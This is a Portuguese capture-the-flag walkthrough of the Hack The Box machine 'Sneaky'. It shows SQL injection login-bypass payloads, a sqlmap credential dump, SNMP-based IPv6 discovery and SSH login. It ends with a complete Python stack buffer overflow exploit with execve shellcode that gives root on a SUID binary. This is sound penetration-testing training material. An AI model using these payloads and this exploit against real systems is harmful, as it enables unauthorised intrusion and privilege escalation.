---
title: "Hack The Box - Sneaky"
tags: [Linux,Medium,Gobuster,IPv6,BurpSuite,Buffer Overflow Linux]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/19>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos apenas uma porta aberta no servidor

> Porta 80 - Servidore Web

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_web.png)


### Gobuster na porta 80

Então rodamos o Gobuster na página pra ver se conseguimos algo nela

gobuster dir -u http://10.10.10.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_gobuster.png)

Explicação parâmetros

> dir --> modo discover

> -w --> wordlist utilizada

> -t 50 --> aumentar as threads para ir mais rápido

Encontramos apenas essa pasta /dev, então entramos nela

### /dev

Verificando do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_dev1.png)

Hummm, possivelmente devemos fazer algum tipo de SQLInjection nele, pra facilitar vamos mandar pro BurpSuite

### BurpSuite

Atualizamos a requisição e mandamos pro BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_burp1.png)

Mandamos pro Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_burp2.png)

Começamos a brincar um pouco com a requisição

Primeiro mandamos um '

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_burp3.png)

Agora mandamos um `' OR '1' = '1`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_burp4.png)

Conseguimos bypassar o acesso!

Obs: também iriamos conseguir com `' or 1=1 #`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_burp5.png)

Certo...

### SQLI com o SQLMAP

Outra opção bacana também de deixar realizando o dump é através do SQLMAP, ele demora um pouco, mas enquanto vamos enumerando outras coisas é o caso deixar ele rodando

Primeiro passo é salvar a requisição que suspeitamos que contenha alguma vulnerabilidade em um arquivo (Requisição do BupSuite)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_sqlmap.png)

Depois de salva, o segundo passo é iniciar a enumeração

`sqlmap -r sql.req`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_sqlmap1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_sqlmap2.png)

Agora tentar realizar o dump, uma vez que ele encontrou uma vulnerabilidade

`sqlmap -r sql.req --dump`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_sqlmap3.png)

Encontramos senhas e usuários

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_sqlmap4.png)

Com esses usuários e senhas também conseguimos acesso ao painel para pegar a chave SSH

## Acessando /dev

Agora que já sabemos como bypassar vamos acessar o painel

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_burp6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_burp7.png)

Pegamos a chave ssh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_burp8.png)

Também dois possíveis usuários

```
name: admin
name: thrasivoulos
```

Ta, blz temos a chave SSH mas e a porta pra acessar? Não! Vamos fazer um nmap nas portas UDP

## Nmap UDP

`nmap -sU -F --max-retries 0 10.10.10.20`

Depois de finalizada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_nmap1.png)

Apareceu uma porta 161 SNMP mas nada de SSH! Pqp!

# Enumeração SNMP

Bom, uma vez que temos uma porta SNMP aberta, é interessante começar a enumerar ela, a ideia aqui é através dela conseguir um endereço de IPv6 e a partir dele enumerar pra ver se acho a porta SSH

## Enumeração IPv6 'na mão'

`snmpwalk -v2c -c public 10.10.10.20`

Hummm... encontramos várias coisas, mas tudo em IPV6 (está em decimal, por isso aparece assim)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_snmp.png)

O modo mais fácil de realizar essa conversão é com o `snmp-mibs-downloader` ele faz automaticamente essa conversão

Então vamos instalar ele

`apt-install snmp-mibs-downloader`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_snmp1.png)

Agora devemos alterar no arquivo de configuração do SNMP para ele realizar essa conversão automática

Antes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_snmp2.png)

Depois

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_snmp3.png)

Rodamos o comando novamente jogando a saida para o arquivo `snmp-ipv6`

`snmpwalk -v2c -c public 10.10.10.20 > snmp-ipv6`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_snmp4.png)

Agora olhando o arquivo encontramos um IPv6

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_snmp5.png)

## Enumeração IPv6 por ferramenta

Era o que precisavamos... Agora iremos utilizar uma ferramenta do próprio criado da máquina (sim, isso mesmo), pra descobrir qual é o endereço que devemos utilizar pra acessar o servidor SSH da máquina (outro método)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_snmp6.png)

> https://github.com/trickster0/Enyx

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_snmp7.png)

Baixamos pra máquina ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_snmp8.png)

Utilizamos pra pegar o IPv6, antes devemos desabilitar o MIBS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_snmp9.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_snmp10.png)

[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:13d3

# Escaneamento IPv6

Agora com o IPv6 da máquina, vamos escanear ela por IPv6, pra ver se encontramos a bendita porta SSH

`nmap -6 -sV -sC -Pn dead:beef:0000:0000:0250:56ff:feb9:13d3`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_snmp11.png)

Explicação nmap

> -6 --> Habilita o IPv6

Ai está! Show de bola, agora vamos logar

## Login SSH IPv6

Com a chave que temos, iremos realizar o login no servidor ssh

Login que deu certo é o: thrasivoulos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_ssh.png)

# Escalação de Privilégio

Uma vez com um usuário na máquina, agora podemos iniciar a escalação de privilégio

Rodamos o linpeas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_linpeas.png)

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_linpeas1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_linpeas2.png)

Encontramos esse binário estranho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_linpeas3.png)

Muito possivelmente a escalação de privilégio vai ser por ele

Então, vamos passar ele para nossa máquina, pra poder trabalhar melhor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_chal.png)

## Buffer Overflow

Bom, está mais que na cara que devemos realizar o Buffer Overflow dessa aplicação pra podermos virar root. Novamente, Buffer Overflow em linux sempre foi muito difícil pra mim, a minha base em exploração binária é bem fraca, ainda mais em Linux, por isso vou tentar ser o mais explicativo pra você que está lendo

É metódico a exploração binária, devemos seguir alguns passos, fazendo assim como se fossem checkpoints do que deve ser feito

Primeiro passo é verificar quais proteções estão ativas no binário, para isso utilizamos o `checksec`

O comando é simples `checksec chal` e a saída é essa:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_chal1.png)

Para nossa surpresa, o NX está desabilitado, isso nos permite executar códigos diretamente na Stack, facilitando nossa exploração (pode acreditar, a exploração que será desenvolvida aqui agora é uma das mais simples quando falamos de exploração binária de linux, mesmo que pra mim isso não tem nada de simples)

Bom, uma vez que temos todas as proteções desabilitadas, é hora de verificarmos onde ocorre o crash da aplicação, isso é simples, devemos mandar uma string para a aplicação e ver o que acontece

Primeiro somente executamos ela e vemos que já deu crash, mas a questão é saber o ponto exato de crash

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_chal2.png)

Então vamos lá, abrir ele no gdb (eu uso a extensão gef pra facilitar a exploração)

`gdb ./chal`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_chal4.png)

Criamos o offset a ser enviado para a aplicação

`pattern create 500`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_chal3.png)

Enviamos a string de 500 bytes pra aplicação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_chal5.png)

Verificamos o que está no EIP

`adqa`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_chal6.png)

Verificamos o ponto exato que está esse `adqa`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_chal7.png)

362 Bytes é o ponto exato que começa a sobrescrever o EIP, vamos testar pra ver se é por ali mesmo?

`r $(python -c 'print "A"*362 + "BBBB"')`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_chal8.png)

Sim! Como temos BBBB no EIP quer dizer que conseguimos controlar ele

Bom, sabendo que o NX está desabilitado nessa máquina, sabemos que podemos executar códigos direto na Stack (pilha de execução). Então vamos fazer isso

Devemos saber qual código queremos que seja executado na Stack, para isso pesquisamos por shell codes na internet

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_sh.png)

> http://shell-storm.org/shellcode/files/shellcode-811.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_sh1.png)

Bom agora vamos começar a montar nosso exploit que será utilizado

Iremos utilizar a técnica do `Nop Sled`, o que é isso? Por exemplo, não precisamos saber exatamente o ponto que está o EIP, sendo um ponto próximo, nós povoamos o payload com \x90, que é null, não faz nada, ele vai "escorregando" até chegar no buffer

exploit.py
```
# Tamanho do buffer

BUFFER_SIZE=362

#ShellCode utilizado

SHELL_CODE = "\x31\xc0\x50\x68\x2f\x2f\x73"
SHELL_CODE += "\x68\x68\x2f\x62\x69\x6e\x89"
SHELL_CODE += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
SHELL_CODE += "\xcd\x80\x31\xc0\x40\xcd\x80"

#Nops

NOP_SLED = "\x90"*(BUFFER_SIZE-len(SHELL_CODE))

EIP = ?

PAYLOAD = NOP_SLED + SHELL_CODE + EIP
print PAYLOAD
```

Agora vamos descobrir o local do EIP na memória, pra isso temos que ir na máquina Sneaky e abrir o `Chal` no gdb

`gdb /usr/local/bin/chal`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_eip.png)

Jogamos um buffer de 400 bytes na memória, pra conseguirmos vizualizar onde está o EIP

`r $(python -c 'print "A"*400')`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_eip1.png)

Agora devemos vizualizar o ESP pra ver em qual byte ele está

`x/100 $esp` ou `i r esp`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_eip2.png)

Puts... calma ai que já confundiu tudo... Eu pesquisei o ESP pra colocar no EIP?! 

Vamos lá, pq eu fiz isso? A ideia do buffer overflow é eu controlar o EIP, certo? O EIP é o endereço do próximo código a ser executado na memória... se eu colocar o ESP lá, ele vai saltar pro ESP, onde eu tenho espaço pra colocar o meu shellcode... hummmmmm, agora entendi, eu vou povoar o EIP com o endereço do ESP, pra qnd ele for executar, vai executar o que estiver no ESP... isso ai! Ta, mas e pra que server os Nops então? A ideia dos Nops é pq a memória é dinâmica, as vezes da bug, se fosse pensar assim eu deveria saber exatamente onde está o inicio do shellcode, ai como tem os nops, ele da um "escorregada" até encontrar o shellcode... Encontrei uma imagem bacana que explica o que está acontecendo.... (https://hausec.com/2018/04/02/simple-buffer-overflows-x32/)

Exatamente isso que vai ocorrer!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_eip3.png)

Certo, vamos então incrementar nosso exploit

exploit.py
```
# Tamanho do buffer

BUFFER_SIZE=362

#ShellCode utilizado

SHELL_CODE = "\x31\xc0\x50\x68\x2f\x2f\x73"
SHELL_CODE += "\x68\x68\x2f\x62\x69\x6e\x89"
SHELL_CODE += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
SHELL_CODE += "\xcd\x80\x31\xc0\x40\xcd\x80"

#Nops

NOP_SLED = "\x90"*(BUFFER_SIZE-len(SHELL_CODE))

# 0xbffff550

EIP = "\x50\xf5\xff\xbf"

PAYLOAD = NOP_SLED + SHELL_CODE + EIP
print PAYLOAD

```

O payload ficou assim

Binário - Nops tamanho do buffer até o EIP + shellcode + Endereço do ESP

Vamos testar então... pra ver se deu certo ou não

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_eip4.png)

Não deu! Vamos debugar pra ver o que está acontecendo, pra isso abrimos ele e executamos dentro do gdb

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_eip5.png)

Verificamos o que está no ESP nesse momento

Não encontramos nops, estranho...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_eip6.png)

Então vamos verificar 500 endereços acima do ESP, agora começaram a aparecer os NOPS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_eip7.png)

Subimos mais 500 e encontramos o endereço que setamos pra ser o EIP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_eip8.png)

Hum... ta estranho, pq ele não bate em nops e subindo mais 500 endereços, encontramos mais NOPS, então os nops estão em locais diferentes da memória

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_eip9.png)

Subimos mais 500 pra verificar qual podemos utilizar pra ser nosso novo EIP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_eip10.png)

Vamos utilizar esse `0xbffff870`, poderia ser qualquer um acima, iria dar certo, uma vez que só tem Nops neles

Corrigimos o exploit

### Exploit final

exploit.py
```
# Tamanho do buffer

BUFFER_SIZE=362

#ShellCode utilizado

SHELL_CODE = "\x31\xc0\x50\x68\x2f\x2f\x73"
SHELL_CODE += "\x68\x68\x2f\x62\x69\x6e\x89"
SHELL_CODE += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
SHELL_CODE += "\xcd\x80\x31\xc0\x40\xcd\x80"

#Nops

NOP_SLED = "\x90"*(BUFFER_SIZE-len(SHELL_CODE))

# 0xbffff550

# Novo Eip 0xbffff870

EIP = "\x70\xf8\xff\xbf"

PAYLOAD = NOP_SLED + SHELL_CODE + EIP
print PAYLOAD
```

Executamos e viramos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_eip11.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_ser.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sneaky/S_root.png)